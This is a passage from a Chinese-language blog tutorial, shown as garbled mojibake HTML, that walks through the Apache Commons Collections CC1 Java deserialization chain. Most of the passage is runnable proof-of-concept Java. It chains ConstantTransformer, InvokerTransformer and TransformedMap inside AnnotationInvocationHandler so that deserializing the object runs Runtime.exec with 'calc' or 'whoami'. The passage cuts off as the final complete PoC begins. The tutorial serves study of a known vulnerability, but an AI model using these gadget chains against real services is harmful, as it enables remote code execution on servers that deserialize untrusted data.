ChainedTransformer(transformers);<br>        HashMap&lt;Object, Object&gt; hm = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>        Map decorate = TransformedMap.decorate(hm, <span class="hljs-keyword">null</span>, chainedTransformer);<br>        decorate.put(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;b&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>åˆ›å»ºä¸€ä¸ª<code>transformer</code>å¯¹è±¡é“¾(Transformer æ•°ç»„å­˜å‚¨)ï¼š<strong>ConstantTransformer-&gt;è¿”å›å½“å‰ Runtime ç¯å¢ƒçš„ Runtime å¯¹è±¡ï¼›InvokerTransformer-&gt;åˆ©ç”¨å…¶é‡å†™çš„ transformer æ–¹æ³•è¿›è¡Œåå°„è°ƒç”¨ exec æ–¹æ³•</strong></p>
<p>è§¦å‘ï¼šé€šè¿‡åŒ…è£…<code>HashMap</code>ï¼Œä½¿ç”¨<code>TransformerMap</code>ä¿®é¥° Mapï¼Œé€šè¿‡<code>Map.put</code>çš„æ“ä½œè§¦å‘</p>
<p><strong>é€šè¿‡ ConstantTransformerã€ChainedTransformer å®Œæˆ payload åœ¨å®¢æˆ·ç«¯è‡ªå®šä¹‰-&gt;æœåŠ¡ç«¯ååºåˆ—åŒ–æˆ‘ä»¬çš„è¾“å…¥ ChainedTransformer ç±»å‹&amp;è°ƒç”¨ transform æ–¹æ³•</strong>åˆ°è¿™é‡Œè¿˜ä¸è¶³ä»¥å½¢æˆæ¼æ´ï¼Œå› ä¸ºæ˜¾ç„¶æœåŠ¡ç«¯ä¸å­˜åœ¨è¿™ç§ä»£ç </p>
<p>ç„¶è€Œé€šè¿‡<code>TransformerMap</code>è¿›ä¸€æ­¥åœ°å»¶é•¿åˆ©ç”¨é“¾ï¼š<strong>è§¦å‘æ¡ä»¶ä»æ˜¾æ€§çš„è°ƒç”¨è½¬æ¢é“¾çš„ transform å‡½æ•°å»¶ä¼¸åˆ°ä¿®æ”¹ map çš„å€¼ï¼Œè€Œè¿™æ˜¯ä¸€ä¸ªå¸¸è§„æ“ä½œå¹¶å­˜åœ¨äºæœåŠ¡æ®µï¼Œå› æ­¤ææœ‰å¯èƒ½è¢«è§¦å‘</strong></p>
<p>ç„¶è€Œè¿™æ ·æ·»åŠ å…ƒç´ çš„æ“ä½œæˆ–è€…ä¿®æ”¹æŸä¸ªé”®å€¼å·²ç„¶å¾ˆå¸¸è§äº†ï¼Œä½†æˆ‘ä»¬ç¬¦åˆååºåˆ—åŒ–æ”»å‡»çš„æ”»å‡»æ›´ç›´æ¥çš„æ˜¯è§¦å‘ä¸€ä¸ªç±»çš„<code>readObject</code>å¯¹ Map çš„æ•°å€¼è¿›è¡Œæ“ä½œ</p>
<h4 id="â‘ jdk1-7-AnnotationInvocationHandler"><a href="#â‘ jdk1-7-AnnotationInvocationHandler" class="headerlink" title="â‘ jdk1.7 AnnotationInvocationHandler"></a>â‘ jdk1.7 AnnotationInvocationHandler</h4><p>å®é™…ç¯å¢ƒä¸­<code>Commons Collections</code> + <code>AnnotationInvocationHandler</code> ç»„ä»¶éå¸¸ç»å…¸ï¼Œåœ¨ jdk 1.7 ä¸­æœ‰ä¸€ä¸ªå­˜åœ¨ä¸€ä¸ªå¯åˆ©ç”¨çš„ readObject ç‚¹ <code>sun.reflect.annotation.AnnotationInvocationHandler</code>ï¼Œåœ¨ idea ä¸­ç›´æ¥æœç´¢ï¼Œçœ‹åˆ°å…¶<code>readObject</code>æ–¹æ³•ä»¥åŠæ„é€ æ–¹æ³•</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java">AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) &#123;<br>        Class[] var3 = var1.getInterfaces();<br>        <span class="hljs-keyword">if</span> (var1.isAnnotation() &amp;&amp; var3.length == <span class="hljs-number">1</span> &amp;&amp; var3[<span class="hljs-number">0</span>] == Annotation.class) &#123;<br>            <span class="hljs-keyword">this</span>.type = var1;<br>            <span class="hljs-keyword">this</span>.memberValues = var2;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> AnnotationFormatError(<span class="hljs-string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);<br>        &#125;<br>    &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(ObjectInputStream var1)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;<br>        var1.defaultReadObject();<br>        AnnotationType var2 = <span class="hljs-keyword">null</span>;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            var2 = AnnotationType.getInstance(<span class="hljs-keyword">this</span>.type);<br>        &#125; <span class="hljs-keyword">catch</span> (IllegalArgumentException var9) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> InvalidObjectException(<span class="hljs-string">&quot;Non-annotation type in annotation serial stream&quot;</span>);<br>        &#125;<br><br>        Map var3 = var2.memberTypes();<br>        Iterator var4 = <span class="hljs-keyword">this</span>.memberValues.entrySet().iterator();<br><br>        <span class="hljs-keyword">while</span>(var4.hasNext()) &#123;<br>            Map.Entry var5 = (Map.Entry)var4.next();<br>            String var6 = (String)var5.getKey();<br>            Class var7 = (Class)var3.get(var6);<br>            <span class="hljs-keyword">if</span> (var7 != <span class="hljs-keyword">null</span>) &#123;<br>                Object var8 = var5.getValue();<br>                <span class="hljs-keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="hljs-keyword">instanceof</span> ExceptionProxy)) &#123;<br>                    var5.setValue((<span class="hljs-keyword">new</span> AnnotationTypeMismatchExceptionProxy(var8.getClass() + <span class="hljs-string">&quot;[&quot;</span> + var8 + <span class="hljs-string">&quot;]&quot;</span>)).setMember((Method)var2.members().get(var6)));<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>å¯¹äº<code>readObject</code>ï¼Œ<code>this.memberValues.entrySet().iterator()</code>ï¼Œæ„é€ æ–¹æ³•å¯çŸ¥è¿™æ˜¯<code>Map&lt;String, Object&gt;.entrySet().iterator()</code>ï¼Œä»å‰é¢çš„ä»£ç æ¥è¯´ï¼Œè¿™é‡Œæ˜¯ç»è¿‡äº†<code>TransformedMap</code>ä¿®é¥°åçš„å¯¹è±¡ï¼Œåé¢çš„ä»£ç é€»è¾‘æ˜¯éå†å…ƒç´ å¹¶ä¾æ¬¡è®¾ç½®å€¼ï¼Œè€Œåœ¨è°ƒç”¨<code>setValue</code>æ—¶å°±å’Œ<code>Map.put()</code>æ–¹æ³•ä¸€æ ·</p>
<p>æ­¤æ—¶æˆ‘ä»¬å¯ä»¥å°è¯•ç¼–å†™ poc</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC1;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC1EzbyP</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[] &#123;<br>          <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.getRuntime()),<br>          <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>        Map decorate = TransformedMap.decorate(hm,<span class="hljs-keyword">null</span>,chainedTransformer);<br>        hm.put(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;b&quot;</span>);<br><br>        <span class="hljs-comment">//åå°„è·å–AnnotationInvocationHandlerå¯¹è±¡</span><br>        Class cl = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);<br>        ctor.setAccessible(<span class="hljs-keyword">true</span>);<br>        Object instance = ctor.newInstance(Target.class, decorate);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(instance);<br>        oos.flush();<br>        oos.close();<br><br>        <span class="hljs-comment">//æ¨¡æ‹ŸæœåŠ¡ç«¯ååºåˆ—åŒ–</span><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>ä¸å‡ºæ„å¤–çš„è¯å‡ºäº†æ„å¤–ï¼š<code>Exception in thread &quot;main&quot; java.io.NotSerializableException: java.lang.Runtime</code>ï¼Œå°±æ˜¯æˆ‘ä»¬<code>Transformer</code>æ•°ç»„å‚¨å­˜çš„<code>new ConstantTransformer(Runtime.getRuntime)</code>ä¸­ï¼Œ<code>Runtime</code>ç±» å¹¶ä¸æ”¯æŒåºåˆ—åŒ–(æ²¡æœ‰å®ç° Serializable æ¥å£)ï¼Œè¦è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œè¿˜å¾—é€šè¿‡åå°„æ¥</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java">Class clz = Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>Constructor declaredConstructor = clz.getDeclaredConstructor();<br>declaredConstructor.setAccessible(<span class="hljs-keyword">true</span>);<br>Object newInstance = declaredConstructor.newInstance();<br>Method execMeth = clz.getDeclaredMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br>execMeth.invoke(newInstance,<span class="hljs-string">&quot;whoami&quot;</span>);<br><br>æˆ–å•ä¾‹æ¨¡å¼ï¼š<br>Class clz = Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>Method getRuntimeMeth = clz.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>);<br>Runtime runtime = (Runtime) getRuntimeMeth.invoke(<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>);<br>Method execMeth = clz.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br>execMeth.invoke(runtime, <span class="hljs-string">&quot;calc&quot;</span>);<br></code></pre></td></tr></table></figure>

<p>å†™è¿›<code>Transformer</code>æ•°ç»„</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC1;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.*;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC1TransformedMap</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)&#125;;<br><br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>        hm.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>);<br>        Map decorate = TransformedMap.decorate(hm, <span class="hljs-keyword">null</span>, chainedTransformer);<br><br>        Class clz = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor declaredConstructor = clz.getDeclaredConstructor(Class.class, Map.class);<br>        declaredConstructor.setAccessible(<span class="hljs-keyword">true</span>);<br>        Object newInstance = declaredConstructor.newInstance(Retention.class, decorate);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(newInstance);<br>        oos.flush();<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//ç¼–å†™æŠ€å·§ï¼Ÿhttps://www.bilibili.com/video/BV1no4y1U7E1  32:40</span><br><span class="hljs-comment">//1. å…ˆå†™å‡ºåå°„ 2. ä¾‹å¦‚InvokerTransformeræ„é€ æ–¹æ³•å¾—çŸ¥ï¼Œç¬¬ä¸€ä¸ªå‚æ•°å¿…å®šä¼ å…¥methodNameï¼›ç¬¬äºŒä¸ªå‚æ•°æ˜¯å‚æ•°åˆ—è¡¨(Classæ•°ç»„å‹)ï¼Œè‡³äºæ•°ç»„å¡«å…¥ä»€ä¹ˆï¼Œé‚£ä¹ˆå°±çœ‹å…·ä½“çš„æ–¹æ³•å‚æ•°ç±»å‹å†™è¿›æ•°ç»„ï¼›ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯ä¼ å…¥çš„å‚æ•°å€¼(Objectæ•°ç»„å‹)ï¼Œè¿™ä¸ªä¸€å®šè¦å’Œç¬¬äºŒä¸ªå‚æ•°æƒ…å½¢ä¸€è‡´ï¼Œæ¯”å¦‚Method getRuntimeMeth = clz.getMethod(&quot;getRuntime&quot;);è¿™æ ·åå°„æ˜¯å¯ä»¥çš„ï¼Œä½†æ˜¯å¡«å…¥Objectæ•°ç»„éœ€è¦å¡«å†™å®Œæ•´</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">Class clz = Class.forName(&quot;java.lang.Runtime&quot;);</span><br><span class="hljs-comment">Method getRuntimeMeth = clz.getMethod(&quot;getRuntime&quot;);</span><br><span class="hljs-comment">Runtime runtime = (Runtime) getRuntimeMeth.invoke(null, null);</span><br><span class="hljs-comment">Method execMeth = clz.getMethod(&quot;exec&quot;, String.class);</span><br><span class="hljs-comment">execMeth.invoke(runtime, &quot;calc&quot;);</span><br><span class="hljs-comment">*/</span><br><br>            Method getRuntimeMeth = (Method) <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class,Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">null</span>&#125;).transform(Runtime.class);<br>            Runtime r =(Runtime) <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;).transform(getRuntimeMeth);<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;).transform(r);<br><br><span class="hljs-comment">//ç„¶ååˆ©ç”¨Transformæ•°ç»„+ChainedTransformeræ¥æŠŠè¿™äº›ä¸²èµ·æ¥ï¼Œæ³¨æ„åˆ°æˆ‘ä»¬æ˜¯ä»åå°„çš„çš„getMethodå¼€å§‹å†™çš„ï¼Œä¸²èµ·æ¥çš„é“¾å¦‚ä½•è°ƒç”¨å‘¢ï¼ŒChainedTransformer.transformæ–¹æ³•æ˜¯å¾ªç¯è°ƒç”¨Transformeræ•°ç»„çš„ï¼Œå› æ­¤ä¼ ç»™æ•°ç»„çš„ç¬¬ä¸€ä¸ªå€¼å³å¯</span><br><br><span class="hljs-keyword">package</span> CommonsCollections.CC1;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC1TransformedMap</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Transformer[] transformers = &#123;<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br><br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br><br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br><br>        &#125;;<br><br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        chainedTransformer.transform(Runtime.class);<br><br><span class="hljs-comment">//        Method getRuntimeMeth = (Method) new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;).transform(Runtime.class);</span><br><span class="hljs-comment">//        Runtime r = (Runtime) new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;).transform(getRuntimeMeth);</span><br><span class="hljs-comment">//        new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;).transform(r);</span><br><br><span class="hljs-comment">//        Class clz = Class.forName(&quot;java.lang.Runtime&quot;);</span><br><span class="hljs-comment">//        Method getRuntimeMeth = clz.getMethod(&quot;getRuntime&quot;);</span><br><span class="hljs-comment">//        Runtime runtime = (Runtime) getRuntimeMeth.invoke(null, null);</span><br><span class="hljs-comment">//        Method execMeth = clz.getMethod(&quot;exec&quot;, String.class);</span><br><span class="hljs-comment">//        execMeth.invoke(runtime, &quot;calc&quot;);</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>ç„¶åé…åˆå¤å†™ç‚¹ï¼ŒæŠŠ<code>chainedTransformer.transform(Runtime.class);</code>é€šè¿‡<code>ConstantTransformer</code>æŠŠå€¼å›ºåŒ–åœ¨æ•°ç»„ç¬¬ä¸€ä½ï¼Œè§¦å‘äº†ååºåˆ—åŒ–å°±èƒ½ç›´æ¥å¾ªç¯æ•°ç»„ RCE äº†</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">Class clz = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>         Constructor declaredConstructor = clz.getDeclaredConstructor(Class.class, Math.class);<br>         declaredConstructor.setAccessible(<span class="hljs-keyword">true</span>);<br>         declaredConstructor.newInstance(Target.class,transformers);<br></code></pre></td></tr></table></figure>

<p>ç”±äºåç»­æ¶‰åŠåˆ°<code>hm.put()</code>ç¬¬ä¸€ä¸ªå‚æ•°å¿…é¡»ä¸º<code>value</code>æ‰èƒ½è§¦å‘çš„é—®é¢˜</p>
<p>è¿™é‡Œç›´æ¥ç»™å‡ºå®Œæ•´å¯æ‰§è¡Œçš„ poc:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC1;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC1TransformedMap</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException </span>&#123;<br>        Transformer[] transformers = <span 